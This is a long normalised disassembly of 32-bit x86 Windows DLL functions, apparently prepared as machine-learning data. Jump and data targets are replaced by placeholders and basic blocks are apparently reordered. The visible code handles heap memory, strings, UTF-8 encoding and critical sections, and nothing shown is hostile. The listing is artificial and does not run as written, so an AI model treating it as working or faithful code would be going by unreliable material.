push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esp + 0x8498 ] 0xffffffff
mov [ esp + 0x54 ] 0x7
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] ax
cmp [ esp + 0x8c ] esi
jb r-xdata
mov edx [ esp + 0x40 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
lea eax [ edi + 0x2c ]
mov [ esp + 0x8c ] 0x7
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] dx
cmp [ eax + 0x14 ] esi
jb r-xdata
mov ecx [ esp + 0x78 ]
push ecx
call sub_1000a86e
add esp 0x4
push eax
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
call [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
push edx
push esi
mov [ edi + 0x50 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esp + 0x14 ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
push ecx
push esi
call sub_1007f580
mov edx [ esp + 0x1c ]
add esp 0xc
add edi 0xa0
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] edx
call sub_1003ac30
mov edx [ esp + 0x20 ]
mov eax [ edx + 0x78 ]
mov eax [ eax + 0x78 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov ecx [ edx + 0x8c ]
cmp [ ecx + eax + 0x14 ] 0x3
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ecx + eax + 0x1c ]
mov eax [ edx + 0x8c ]
mov eax [ ecx + eax + 0x8 ]
mov edx [ edx + 0x98 ]
lea ecx [ esp + 0x14 ]
push ecx
add edx eax
call edx
add esp 0x4
xor eax eax
sub_100272b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100861eb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_1002e3ac
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_1003f6d0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
test esi esi
jne r-xdata
test edi edi
je r-xdata
push 0x8007000e
call sub_1003f6d0
sub_10027350
push esi
mov esi [ eax ]
push edi
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ lstrcmpW@IAT ]
mov edi edi
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
retn
mov ecx [ ebx + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call edi
test eax eax
je r-xdata
sub_100273a0
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_10030594
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_10057aa0
mov eax esi
cmp eax esi
jae r-xdata
sub_10027430
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10027450
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_10034533
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_1002be90
push esi
call sub_1000a86e
pop ecx
sub_10027490
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x20 ]
mov [ ebx ] eax
mov [ esi ] ecx
mov edx [ ebx ]
push edi
cmp edx [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebx ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov edi [ ebp + 0x1c ]
cmp [ esi ] edi
je r-xdata
mov eax [ ebx ]
movzx edx [ eax ]
cmp edx 0x10ffff
ja r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
cmp edx 0x80
jae r-xdata
mov ecx edx
cmp edx 0x800
jae r-xdata
mov cl dl
xor eax eax
jmp r-xdata
cmp edx 0x10000
jae r-xdata
shr ecx 0x6
or cl 0xc0
mov eax 0x1
jmp r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0x0
jne r-xdata
cmp edx 0x200000
jae r-xdata
shr ecx 0xc
or cl 0xe0
mov eax 0x2
jmp r-xdata
sub edi [ esi ]
lea ebx [ eax + 0x1 ]
cmp edi ebx
mov ebx [ ebp + 0x14 ]
jl r-xdata
mov [ ebx ] 0x1
cmp edx 0x4000000
jae r-xdata
shr ecx 0x12
or cl 0xf0
mov eax 0x3
jmp r-xdata
add [ ebx ] 0x2
mov edi [ esi ]
mov [ edi ] cl
inc [ esi ]
mov edi [ esi ]
test eax eax
jle r-xdata
shr ecx 0x1e
or cl 0xfc
mov eax 0x5
shr ecx 0x18
or cl 0xf8
mov eax 0x4
jmp r-xdata
mov edx [ ebx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
lea ecx [ eax + eax * 2 ]
add ecx ecx
jmp r-xdata
sub ecx 0x6
mov ebx edx
shr ebx cl
dec eax
mov [ ebp + 0x20 ] ecx
and bl 0x3f
or bl 0x80
mov [ edi ] bl
inc [ esi ]
mov edi [ esi ]
test eax eax
jg r-xdata
mov ecx [ ebp + 0x20 ]
mov ebx [ ebp + 0x14 ]
sub_100275b9
push 0x38
mov eax sub_100852a6
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006b26d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_1002766d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100591cb
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_100276a0
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x10
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov eax [ ecx + 0xf0 ]
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x30 ]
call eax
sub_10027713
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10037434
pop ecx
pop ebp
retn
sub_10027750
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xfb
sub eax 0x2
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov [ esi ] eax
mov eax [ ecx + 0x24 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x68
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
call sub_1002f620
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_100277d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a570
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx ]
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x4 ]
push ecx
call sub_1005e720
mov ecx [ ebx ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x70 ] eax
call sub_1005c910
mov eax [ eax ]
mov edi [ HeapFree@IAT ]
test eax eax
mov eax [ ebp - 0x64 ]
setne [ ebp - 0x69 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x69 ] 0x0
lea esi [ ebp - 0x68 ]
je r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
mov eax [ ebx ]
push eax
call sub_1004c900
mov esi [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
call sub_1005c910
mov ebx [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_10054bf0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x68 ]
mov esi eax
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ ebp - 0x70 ]
cmp eax 0x7
jne r-xdata
mov ecx [ ebx ]
push ecx
lea esi [ ebp - 0x68 ]
call sub_1004c900
mov esi [ eax ]
mov eax [ ebp - 0x64 ]
dec [ eax ]
xor ebx ebx
cmp [ eax ] ebx
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
cmp eax 0x2
jne r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] 0x0
test eax eax
je r-xdata
call sub_10054bf0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x8
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx ebx
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
push 0x3e8
call [ Sleep@IAT ]
xor eax eax
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x60 ]
call sub_1004a920
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_1002f270
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4c ] 0x8
mov esi eax
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov ecx [ ebx + 0x14 ]
jb r-xdata
mov [ ebp - 0x64 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
cmp eax 0x9
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_10027750
mov [ ebp - 0x4 ] 0x1
mov ecx [ eax ]
call sub_10007a50
cmp eax 0xb
jne r-xdata
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] ebx
cmp eax ebx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edx edx
mov [ ebp - 0x4c ] 0x7
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x60 ] dx
cmp esi edi
je r-xdata
mov ecx [ ebp - 0x60 ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x6
jne r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_10027750
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax ]
call sub_10024760
jmp r-xdata
push 0x1
call sub_10009040
mov ecx esi
call sub_1005dd50
jmp r-xdata
lea ecx [ ecx ]
mov [ ebp - 0x64 ] ebx
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x6
call edx
jmp r-xdata
cmp esi [ rw-data ]
jne r-xdata
add esi 0x24
cmp esi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_1002da69
add esp 0x8
test eax eax
je r-xdata
cmp eax 0xc
jne r-xdata
xor edx edx
cmp [ rw-data ] edx
sete dl
mov [ rw-data ] edx
jmp r-xdata
lea esi [ ebp - 0x68 ]
mov ecx ebx
call sub_10027750
mov [ ebp - 0x4 ] 0x3
mov ecx [ eax ]
call sub_10007720
jmp r-xdata
test eax eax
lea edi [ ebp - 0x68 ]
sete bl
mov [ ebp - 0x4 ] 0xffffffff
call sub_1005b920
test bl bl
je r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
lea edi [ esi + 0x20 ]
lea ecx [ esi + 0x1c ]
mov edx ebx
call sub_10041990
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x3
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x2a
call sub_10069020
lea edx [ ebp - 0x44 ]
mov eax 0x147
call sub_10069020
mov eax [ ebx ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10029180
mov esi eax
test esi esi
je r-xdata
cmp edi [ rw-data ]
je r-xdata
add edi 0x24
cmp edi [ rw-data ]
jne r-xdata
push ecx
push eax
call sub_1002da69
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x4
je r-xdata
push 0x1
call sub_1002f670
jmp r-xdata
mov ecx [ ebx ]
push ecx
lea ecx [ ebp - 0x44 ]
call sub_10029180
mov esi eax
test esi esi
je r-xdata
push esi
call sub_1005ac37
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_10048350
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
lea ecx [ edi + 0x20 ]
push ecx
lea ecx [ edi + 0x1c ]
call sub_10028ec0
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
mov ecx [ esi + 0x10 ]
jb r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x5
jne r-xdata
add esp 0x4
mov eax [ rw-data ]
fld [ eax + 0xfc ]
sub esp 0x8
fstp [ esp + 0x4 ]
fld [ eax + 0xf8 ]
fstp [ esp ]
call sub_100308d0
add esp 0x8
jmp r-xdata
push esi
call sub_1005ac37
fstp [ ebp - 0x70 ]
fld [ ebp - 0x70 ]
fstp [ esp ]
call sub_10024230
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
call sub_100303c0
sub_10027c4c
push 0x3c
mov eax sub_10085747
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004ad92
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000fdf6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10027d03
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10027d98
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_1001f6ab
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10004c10
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_10027dbf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100304a2
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10027df0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10027450
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10027e2c
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
call sub_10051cf5
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x8
push eax
call sub_1005c353
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add esi 0x2
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_1005fe8a
fld [ eax + 0x10 ]
add esp 0xc
cmp [ ebp - 0x20 ] 0x0
je r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10032529
leave
retn
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10027ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008631c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x13c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0x144 ] esi
mov [ ebp - 0x128 ] ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x12c ] ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x13c ] ebx
mov [ ebp - 0x4 ] 0x3
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xd5
call sub_10069020
push esi
lea edx [ ebp - 0x128 ]
lea ecx [ ebp - 0x4c ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x128 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0xec
call sub_10069020
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x138 ]
lea ecx [ ebp - 0x90 ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x138 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
mov eax 0x4
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x120 ]
mov eax 0x140
call sub_10069020
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x130 ]
lea ecx [ ebp - 0x120 ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
mov eax 0x5
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x130 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
mov eax 0x6
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0xd8 ]
mov eax 0x91
call sub_10069020
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x140 ]
lea ecx [ ebp - 0xd8 ]
call sub_10020e20
test eax eax
jne r-xdata
lea esi [ ebp - 0x140 ]
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x140 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
lea esi [ ebp - 0x140 ]
mov [ eax ] dx
call sub_100299a0
lea esi [ ebp - 0x130 ]
call sub_100299a0
lea esi [ ebp - 0x138 ]
call sub_100299a0
lea esi [ ebp - 0x128 ]
call sub_100299a0
cmp edi ebx
jl r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov eax 0x7
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_100282d0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x10 ]
